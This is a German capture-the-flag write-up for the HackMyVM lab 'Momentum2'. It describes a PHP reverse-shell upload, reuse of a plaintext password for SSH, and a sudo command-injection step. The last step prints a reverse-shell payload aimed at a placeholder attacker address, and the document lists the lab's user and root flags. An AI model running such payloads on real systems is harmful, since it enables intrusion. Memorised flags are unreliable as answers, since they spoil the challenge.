# Momentum2 - HackMyVM (Medium)

![Momentum2.png](Momentum2.png)

## Übersicht

*   **VM:** Momentum2
*   **Plattform:** HackMyVM (https://hackmyvm.eu/machines/machine.php?vm=Momentum2)
*   **Schwierigkeit:** Medium
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** [DATUM_HIER_EINFÜGEN]
*   **Original-Writeup:** https://alientec1908.github.io/Momentum2_HackMyVM_Medium/
*   **Autor:** Ben C.

## Kurzbeschreibung

Das Ziel dieser Challenge war es, Root-Rechte auf der Maschine "Momentum2" zu erlangen. Der initiale Zugriff erfolgte durch Ausnutzung einer unsicheren Dateiupload-Funktion in einer Webanwendung (`ajax.php`), die über `/dashboard.html` erreichbar war. Durch das Hochladen einer PHP-Reverse-Shell wurde eine Shell als `www-data` erlangt. In diesem Kontext wurde eine Datei `password-reminder.txt` mit dem Passwort `myvulnerableapp*` gefunden. Dieses Passwort ermöglichte den SSH-Login als Benutzer `athena`. Die finale Rechteausweitung zu Root gelang durch Ausnutzung einer unsicheren `sudo`-Regel, die `athena` erlaubte, ein Python-Skript (`/home/team-tasks/cookie-gen.py`) als Root auszuführen. Dieses Skript war anfällig für OS-Command-Injection, da es Benutzereingaben (den "seed") unsicher verarbeitete.

## Disclaimer / Wichtiger Hinweis

Die in diesem Writeup beschriebenen Techniken und Werkzeuge dienen ausschließlich zu Bildungszwecken im Rahmen von legalen Capture-The-Flag (CTF)-Wettbewerben und Penetrationstests auf Systemen, für die eine ausdrückliche Genehmigung vorliegt. Die Anwendung dieser Methoden auf Systeme ohne Erlaubnis ist illegal. Der Autor übernimmt keine Verantwortung für missbräuchliche Verwendung der hier geteilten Informationen. Handeln Sie stets ethisch und verantwortungsbewusst.

## Verwendete Tools

*   Burp Suite (impliziert für Request-Interception)
*   `nc` (netcat)
*   `ssh`
*   `sudo`
*   Python3
*   Standard Linux-Befehle (`cat`, `bash`, `pty` (Python-Modul), `stty`)

## Lösungsweg (Zusammenfassung)

Der Angriff auf die Maschine "Momentum2" gliederte sich in folgende Phasen:

1.  **Reconnaissance & Web Enumeration (impliziert):**
    *   Die IP-Adresse des Ziels (192.168.2.109 laut Burp-Request) und offene Ports (vermutlich 22/SSH und 80/HTTP) wurden im Vorfeld identifiziert (Schritte im Bericht nicht gezeigt).
    *   Ein POST-Request an `/ajax.php` wurde (wahrscheinlich über `/dashboard.html`) als Datei-Upload-Funktion identifiziert. Ein Cookie `admin=cookie` war vorhanden.

2.  **Initial Access (RCE via File Upload als `www-data`):**
    *   Ein HTTP-POST-Request an `/ajax.php` wurde mit Burp Suite abgefangen.
    *   Der Dateiname im `file`-Parameter wurde zu `rev.php` geändert und der Inhalt durch eine PHP-Reverse-Shell ersetzt.
    *   Die hochgeladene Datei wurde im Verzeichnis `/owls/` gespeichert.
    *   Durch Aufrufen von `http://192.168.2.109/owls/rev.php` wurde die Reverse Shell ausgelöst und eine Verbindung zu einem Netcat-Listener (Port 9001) als `www-data` hergestellt.
    *   Als `www-data` wurde die Datei `password-reminder.txt` gefunden, die das Passwort `myvulnerableapp*` enthielt.

3.  **Privilege Escalation (von `www-data` zu `athena` via SSH):**
    *   Mit dem gefundenen Passwort `myvulnerableapp*` wurde ein erfolgreicher SSH-Login als Benutzer `athena` durchgeführt.
    *   Die User-Flag (`4WpJT9qXoQwFGeoRoFBEJZiM2j2Ad33gWipzZkStMLHw`) wurde in `/home/athena/user.txt` gefunden.

4.  **Privilege Escalation (von `athena` zu `root` via `sudo` Command Injection):**
    *   `sudo -l` als `athena` zeigte (impliziert), dass das Python-Skript `/home/team-tasks/cookie-gen.py` als `root` ausgeführt werden durfte.
    *   Das Skript forderte zur Eingabe eines "seed"-Wertes auf.
    *   Ein OS-Command-Injection-Payload (z.B. `` `bash -c "bash -i >& /dev/tcp/ANGRIFFS_IP/9001 0>&1"` ``) wurde als Seed eingegeben.
    *   Da das Python-Skript den Seed unsicher verarbeitete (wahrscheinlich direkte Übergabe an eine Shell-Funktion), wurde der eingeschleuste Befehl als `root` ausgeführt.
    *   Eine Reverse Shell als `root` wurde auf einem Netcat-Listener (Port 9001) empfangen.
    *   Die Root-Flag (`4bRQL7jaiFqK45dVjC2XP4TzfKizgGHTMYJfSrPEkezG`) wurde in `/root/root.txt` gefunden.

## Wichtige Schwachstellen und Konzepte

*   **Unsichere Dateiupload-Funktion:** Eine Webanwendung (`ajax.php`) erlaubte das Hochladen von PHP-Dateien ohne ausreichende Validierung, was zu Remote Code Execution (RCE) führte.
*   **Information Disclosure (Passwort im Klartext):** Ein Passwort (`myvulnerableapp*`) wurde in einer Textdatei (`password-reminder.txt`) auf dem System gespeichert.
*   **Unsichere `sudo`-Regel:** Ein Benutzer (`athena`) durfte ein Python-Skript als `root` ausführen.
*   **OS Command Injection:** Das mit `sudo`-Rechten ausführbare Python-Skript (`cookie-gen.py`) war anfällig für Command Injection, da es Benutzereingaben (den "seed") unsicher in Shell-Befehlen verwendete.

## Flags

*   **User Flag (`/home/athena/user.txt`):** `4WpJT9qXoQwFGeoRoFBEJZiM2j2Ad33gWipzZkStMLHw`
*   **Root Flag (`/root/root.txt`):** `4bRQL7jaiFqK45dVjC2XP4TzfKizgGHTMYJfSrPEkezG`

## Tags

`HackMyVM`, `Momentum2`, `Medium`, `File Upload RCE`, `PHP Reverse Shell`, `Information Disclosure`, `sudo Exploit`, `Command Injection`, `Python`, `Linux`, `Web`, `Privilege Escalation`
